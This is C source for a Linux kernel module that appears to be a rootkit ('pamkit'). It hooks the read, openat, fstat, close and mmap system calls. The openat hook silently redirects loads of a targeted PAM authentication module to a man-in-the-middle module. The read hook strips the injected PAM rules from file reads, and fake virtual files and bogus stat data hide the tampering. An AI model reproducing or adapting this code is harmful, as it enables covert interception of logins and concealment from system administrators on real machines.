#include "hook_defs.h"
#include "pam_config.h"
#include "vfile.h"
#include "../net.h"
#include "../util/log.h"
#include "../util/user.h"

#include <linux/compiler.h>
#include <linux/dcache.h>
#include <linux/err.h>
#include <linux/errno.h>
#include <linux/fcntl.h>
#include <linux/fdtable.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/fs_struct.h>
#include <linux/ftrace.h>
#include "linux/hashtable.h"
#include <linux/io.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/mm_types.h>
#include <linux/mman.h>
#include <linux/module.h>
#include <linux/path.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/stat.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/version.h>

#pragma GCC optimize("-fno-optimize-sibling-calls")

static DEFINE_SPINLOCK(pid_fd_to_dmod_replacement_cache_lock);
static DEFINE_HASHTABLE(pid_fd_to_dmod_replacement_cache, 16);

struct replacement_cache_entry {
    pid_t pid;
    unsigned int fd;
    disk_mod_config_t *disk_mod_config;
    struct hlist_node node;
};
typedef struct replacement_cache_entry replacement_cache_entry_t;

static inline int
add_replacement_cache_entry(const pid_t pid, const unsigned int fd, disk_mod_config_t *disk_mod_config)
{
    replacement_cache_entry_t *entry;
    spin_lock(&pid_fd_to_dmod_replacement_cache_lock);

    entry = kzalloc(sizeof(replacement_cache_entry_t), GFP_KERNEL);
    if (!entry) {
        prerr_ratelimited("Failed to allocate memory for 'replacement_cache_entry' (pid=%d, fd=%d)", pid, fd);
        spin_unlock(&pid_fd_to_dmod_replacement_cache_lock);
        return -ENOMEM;
    }

    entry->pid = pid;
    entry->fd = fd;
    entry->disk_mod_config = disk_mod_config;
    hash_add(pid_fd_to_dmod_replacement_cache, &entry->node, fd);

    spin_unlock(&pid_fd_to_dmod_replacement_cache_lock);
    return 0;
}

static inline void
del_replacement_cache_entry(const pid_t pid, const unsigned int fd)
{
    replacement_cache_entry_t *entry;
    spin_lock(&pid_fd_to_dmod_replacement_cache_lock);

    hash_for_each_possible(pid_fd_to_dmod_replacement_cache, entry, node, fd) {
        if (entry->pid == pid && entry->fd == fd) {
            hash_del_rcu(&entry->node);
            kfree(entry);
            spin_unlock(&pid_fd_to_dmod_replacement_cache_lock);
            return;
        }
    }

    spin_unlock(&pid_fd_to_dmod_replacement_cache_lock);
    return;
}

static inline disk_mod_config_t *
should_replace(const pid_t pid, const unsigned int fd)
{
    disk_mod_config_t *ret_disk_mod_config;
    replacement_cache_entry_t *entry;
    spin_lock(&pid_fd_to_dmod_replacement_cache_lock);

    hash_for_each_possible(pid_fd_to_dmod_replacement_cache, entry, node, fd) {
        if (entry->pid == pid && entry->fd == fd) {
            ret_disk_mod_config = entry->disk_mod_config;
            spin_unlock(&pid_fd_to_dmod_replacement_cache_lock);
            return ret_disk_mod_config;
        }
    }

    spin_unlock(&pid_fd_to_dmod_replacement_cache_lock);
    return NULL;
}

static char *
fd_to_filepath(const unsigned int fd)
{
    struct file *file;
    char *target_path;
    char *target_path_name_buffer;
    char *ret_path;

    file = fget(fd);
    if (!file) {
        return NULL;
    }

    target_path_name_buffer = (char *) kzalloc(PATH_MAX * sizeof(char), GFP_KERNEL);
    if (!target_path_name_buffer) {
        prerr_ratelimited("Failed to allocate memory for 'target_path_name_buffer' (fd=%d, pid=%d, name=%s)", fd, task_pid_nr(current), current->comm);
        goto error_out_2;
    }

    target_path = d_path(&file->f_path, target_path_name_buffer, PATH_MAX);
    if (IS_ERR(target_path)) {
        prerr_ratelimited("Failed to get file path from file struct (fd=%d, pid=%d, name=%s)", fd, task_pid_nr(current), current->comm);
        goto error_out_1;
    }

    ret_path = kstrdup(target_path, GFP_KERNEL);
    if (!ret_path) {
        prerr_ratelimited("Failed to allocate memory for 'ret_path' (fd=%d, pid=%d, name=%s)", fd, task_pid_nr(current), current->comm);
        goto error_out_1;
    }

    kfree(target_path_name_buffer);
    fput(file);
    return ret_path;

error_out_1:
    kfree(target_path_name_buffer);
error_out_2:
    fput(file);
    return NULL;
}

static long
replace_pam_rules_in_buffer(char __user *buffer, const size_t read_bytes, const disk_mod_config_t *disk_mod_config)
{
    char *modified_usr_buffer;
    char *mod_rule_start;
    size_t mod_offset;
    size_t trailing_chars;
    size_t new_size;

    if (read_bytes < (disk_mod_config->modifications_len - 1)) {
        return read_bytes;
    }

    modified_usr_buffer = (char *) kvzalloc(read_bytes + 1, GFP_KERNEL);
    if (!modified_usr_buffer) {
        prerr_ratelimited("Failed to allocate memory for 'modified_usr_buffer' (pid=%d, name=%s)", task_pid_nr(current), current->comm);
        return -ENOMEM;
    }

    if (copy_from_user(modified_usr_buffer, buffer, read_bytes)) {
        prerr_ratelimited("Failed to copy user buffer to kernel buffer (pid=%d, name=%s)", task_pid_nr(current), current->comm);
        kvfree(modified_usr_buffer);
        return -EFAULT;
    }

    mod_rule_start = strstr(modified_usr_buffer, disk_mod_config->modifications);
    if (!mod_rule_start) {
        kvfree(modified_usr_buffer);
        return read_bytes;
    }

    mod_offset = mod_rule_start - modified_usr_buffer;
    trailing_chars = read_bytes - (mod_offset + disk_mod_config->modifications_len - 1);

    memmove(mod_rule_start, mod_rule_start + disk_mod_config->modifications_len, trailing_chars);
    memset(mod_rule_start + trailing_chars, '\0', disk_mod_config->modifications_len);

    new_size = read_bytes - disk_mod_config->modifications_len;
    if (copy_to_usr(buffer, modified_usr_buffer, new_size)) {
        prerr_ratelimited("Failed to copy the buffer with the PAM rule modifications removed into the user buffer");
        kvfree(modified_usr_buffer);
        return -EFAULT;
    }

    kvfree(modified_usr_buffer);
    return new_size;
}

static long
do_virtual_file_read(char __user *buffer, const size_t req_bytes, vfile_t *virtual_file)
{
    long available_bytes;
    long bytes_to_copy;

    if (req_bytes == 0) {
        return 0;
    }

    mutex_lock(&virtual_file->vf_mutex);

    available_bytes = virtual_file->vfile_data->data_len - virtual_file->pos;
    if (available_bytes <= 0) {
        mutex_unlock(&virtual_file->vf_mutex);
        return 0;
    }

    bytes_to_copy = (available_bytes > req_bytes) ? req_bytes : available_bytes;

    if (copy_to_user(buffer, virtual_file->vfile_data->data + virtual_file->pos, bytes_to_copy)) {
        prerr_ratelimited("Failed to copy data from virtual file to user buffer");
        mutex_unlock(&virtual_file->vf_mutex);
        return -EFAULT;
    }

    virtual_file->pos += bytes_to_copy;

    mutex_unlock(&virtual_file->vf_mutex);
    return bytes_to_copy;
}

SYSCALL_HOOK(read, unsigned int fd, char __user *buf, size_t count)
{
    long ret;
    unsigned int fd_arg;
    vfile_t *virtual_file;
    const disk_mod_config_t *disk_mod_config;

    #ifdef PAMKIT_PTREGS_STUBS
    fd_arg = FIRST_ARG(pt_regs, unsigned int);
    #else
    fd_arg = fd;
    #endif

    virtual_file = get_vfile(task_tgid_vnr(current), fd_arg);
    if (unlikely(virtual_file)) {

        #ifdef PAMKIT_PTREGS_STUBS
        ret = do_virtual_file_read(SECOND_ARG(pt_regs, char __user *), THIRD_ARG(pt_regs, size_t), virtual_file);
        #else
        ret = do_virtual_file_read(buf, count, virtual_file);
        #endif

        put_vfile(virtual_file);
        return ret;
    }

    ret = SYSCALL_ORIG_READ(pt_regs, fd, buf, count);
    if (ret <= 0) {
        return ret;
    }

    disk_mod_config = should_replace(task_tgid_vnr(current), fd_arg);
    if (unlikely(disk_mod_config)) {

        #ifdef PAMKIT_PTREGS_STUBS
        ret = replace_pam_rules_in_buffer(SECOND_ARG(pt_regs, char __user *), ret, disk_mod_config);
        #else
        ret = replace_pam_rules_in_buffer(buf, ret, disk_mod_config);
        #endif
    }

    return ret;
}

static inline int
is_pamkit_target_mod_copy(int dfd, const char *filename)
{
    // libpam (per default) opens the pam modules by its absolute path, so for now
    //  we don't concern ourselves with relative paths
    if (strncmp(filename, TARGET_MOD_COPY_PATH, sizeof(TARGET_MOD_COPY_PATH)) == 0) {
        return 1;
    }

    return 0;
}

SYSCALL_HOOK(openat, int dfd, const char __user *filename, int flags, umode_t mode)
{
    long ret;
    int arg_dfd;
    char *arg_filename;
    void __user *userspace_mitm_module_path;
    virtual_fd_t vfd;
    vf_replacement_rule_t *vf_replacement_rule;
    char *target_path;
    disk_mod_config_t *disk_mod_config;

    #ifdef PAMKIT_PTREGS_STUBS
    arg_dfd = FIRST_ARG(pt_regs, int);
    arg_filename = get_string_from_usr(SECOND_ARG(pt_regs, char*), PATH_MAX * sizeof(char));
    #else
    arg_dfd = dfd;
    arg_filename = get_string_from_usr(filename, PATH_MAX * sizeof(char));
    #endif

    if (unlikely(!arg_filename)) {
        prerr_ratelimited("Unable to copy user provided filename into kernelspace");
        return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
    }

    /* Note: For now we heuristically work with the given 'filepath' and don't try to resolve the absolute path */

    vf_replacement_rule = get_vf_replacement_rule(current->comm, arg_filename);
    if (unlikely(vf_replacement_rule)) {
        kfree(arg_filename);

        vfd = create_vfile(task_tgid_vnr(current), vf_replacement_rule->vfile_data);
        if (unlikely(vfd == 0)) {
            prerr_ratelimited("Failed to create virtual file state");
            return SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
        }

        return vfd;
    }

    /* Check if the calling process tries to open the PAM module that should be replaced */

    if (likely(!strstr(arg_filename, TARGET_PAM_MODULE_NAME))) {
        goto skip_pam_module_replacement;
    }

    /* Do not intercept calls to open the copy of the PAM module used internally by the MitM module */
    if (is_pamkit_target_mod_copy(arg_dfd, arg_filename)) {
        goto skip_pam_module_replacement;
    }

    userspace_mitm_module_path = (void *) vm_mmap(
        NULL,
        0,
        sizeof(MITM_PAM_MODULE_PATH),
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS,
        0
    );

    if (IS_ERR_OR_NULL(userspace_mitm_module_path)) {
        prerr_ratelimited("Failed to allocate userspace buffer holding path to the MitM module");
        goto skip_pam_module_replacement;
    }

    if (copy_to_user(
        userspace_mitm_module_path,
        MITM_PAM_MODULE_PATH,
        sizeof(MITM_PAM_MODULE_PATH)
        )
    ) {
        prerr_ratelimited("Failed to write path of the MitM module into userspace allocated buffer");
        vm_munmap((uintptr_t) userspace_mitm_module_path, sizeof(MITM_PAM_MODULE_PATH));
        goto skip_pam_module_replacement;
    }

    #ifdef PAMKIT_PTREGS_STUBS
    ((struct pt_regs *) pt_regs)->si = (unsigned long) userspace_mitm_module_path;
    #else
    *((char __user **) &filename) = (char __user *) userspace_mitm_module_path;
    #endif

    ret = SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
    kfree(arg_filename);
    vm_munmap((uintptr_t) userspace_mitm_module_path, sizeof(MITM_PAM_MODULE_PATH));

    prdebug_ratelimited("Replaced target pam module with the MitM module");
    return ret;

skip_pam_module_replacement:

    kfree(arg_filename);

    ret = SYSCALL_ORIG_OPENAT(pt_regs, dfd, filename, flags, mode);
    if (ret < 0) {
        return ret;
    }

    /* Note: Having to resolve the full path is slow. If it is known what files should be targeted and they follow a certain
                naming pattern, a fast-path check can / should be implemented instead.
    */
    target_path = fd_to_filepath(ret);
    if (!target_path) {
        return ret;
    }

    disk_mod_config = get_diskmod_config(current->comm, target_path);
    if (unlikely(disk_mod_config)) {
        if (add_replacement_cache_entry(task_tgid_vnr(current), ret, disk_mod_config) != 0) {
            kfree(target_path);
            return -1;
        }
    }

    kfree(target_path);
    return ret;
}

static struct stat *
get_bogus_stats(const size_t size)
{
    struct stat *custom_stat;

    custom_stat = (struct stat *) kzalloc(sizeof(struct stat), GFP_KERNEL);
    if (!custom_stat) {
        prerr_ratelimited("Failed to allocate memory for custom bogus stat struct");
        return NULL;
    }

    custom_stat->st_size = size;
    custom_stat->st_mode = S_IFREG|0644;
    custom_stat->st_dev = 2050;
    custom_stat->st_blksize = 4096;
    custom_stat->st_blocks = 8;

    return custom_stat;
}

SYSCALL_HOOK(fstat, unsigned int fd, struct stat __user *statbuf)
{
    long ret;
    int arg_fd;
    struct stat *custom_stat;
    vfile_t *virtual_file;

    #ifdef PAMKIT_PTREGS_STUBS
    arg_fd = FIRST_ARG(pt_regs, int);
    #else
    arg_fd = fd;
    #endif

    virtual_file = get_vfile(task_tgid_vnr(current), arg_fd);
    if (unlikely(virtual_file)) {

        custom_stat = get_bogus_stats(virtual_file->vfile_data->data_len);
        if (!custom_stat) {
            put_vfile(virtual_file);
            return -EFAULT;
        }

        #ifdef PAMKIT_PTREGS_STUBS
        ret = copy_to_usr(SECOND_ARG(pt_regs, struct stat *), custom_stat, sizeof(struct stat));
        #else
        ret = copy_to_usr(statbuf, custom_stat, sizeof(struct stat));
        #endif

        put_vfile(virtual_file);
        kfree(custom_stat);
        return ret;
    }

    return SYSCALL_ORIG_FSTAT(pt_regs, fd, statbuf);
}

SYSCALL_HOOK(close, int fd)
{
    int fd_arg;
    vfile_t *virtual_file;

    #ifdef PAMKIT_PTREGS_STUBS
    fd_arg = FIRST_ARG(pt_regs, int);
    #else
    fd_arg = fd;
    #endif

    virtual_file = get_vfile(task_tgid_vnr(current), fd_arg);
    if (unlikely(virtual_file)) {
        delete_vfile(task_tgid_vnr(current), fd_arg);
        put_vfile(virtual_file);
        return 0;
    }

    del_replacement_cache_entry(task_tgid_vnr(current), fd_arg);

    return SYSCALL_ORIG_CLOSE(pt_regs, fd);
}

SYSCALL_HOOK(mmap, unsigned long addr, unsigned long len, int prot, int flags, int fd, long off)
{
    int fd_arg;
    int flags_arg;
    char *target_path;
    char *last_path_component;
    char *file_ext;

    #ifdef PAMKIT_PTREGS_STUBS
    fd_arg = FIFTH_ARG(pt_regs, int);
    flags_arg = FOURTH_ARG(pt_regs, int);
    #else
    fd_arg = fd;
    flags_arg = flags;
    #endif

    if (likely(!prevent_pam_mod_mapping)) {
        return SYSCALL_ORIG_MMAP(pt_regs, addr, len, prot, flags, fd, off);
    }

    if (fd_arg < 0 || (flags_arg & MAP_ANONYMOUS )) {
        return SYSCALL_ORIG_MMAP(pt_regs, addr, len, prot, flags, fd, off);
    }

    target_path = fd_to_filepath(fd_arg);
    if (!target_path) {
        return SYSCALL_ORIG_MMAP(pt_regs, addr, len, prot, flags, fd, off);
    }

    last_path_component = strrchr(target_path, '/');
    if (!last_path_component) {
        goto allow_mapping;
    }

    if (strncmp("/pam", last_path_component, sizeof("/pam") - 1) != 0) {
        goto allow_mapping;
    }

    file_ext = strrchr(last_path_component, '.');
    if (!file_ext) {
        goto allow_mapping;
    }

    if (strncmp(".so", file_ext, sizeof(".so") - 1) != 0) {
        goto allow_mapping;
    }

    prinfo("Preventing mapping of '%s'", target_path);
    kfree(target_path);
    return -1;

allow_mapping:
    kfree(target_path);
    return SYSCALL_ORIG_MMAP(pt_regs, addr, len, prot, flags, fd, off);
}

hook_data_t pamkit_syscall_hooks[] = {
    GEN_SYSCALL_HOOK_DATA(read),
    GEN_SYSCALL_HOOK_DATA(openat),
    /* Needs to be defined like this cause of naming inconsistencies in the linux kernel */
    SYSCALL_HOOK_DATA_DEFINE(__syscall_name("fstat"), &SYSCALL_ORIG_NAME(fstat), SYSCALL_HOOK_NAME(fstat), __NR_fstat),
    GEN_SYSCALL_HOOK_DATA(close),
    GEN_SYSCALL_HOOK_DATA(mmap),
    SYSCALL_HOOK_DATA_EMPTY
};
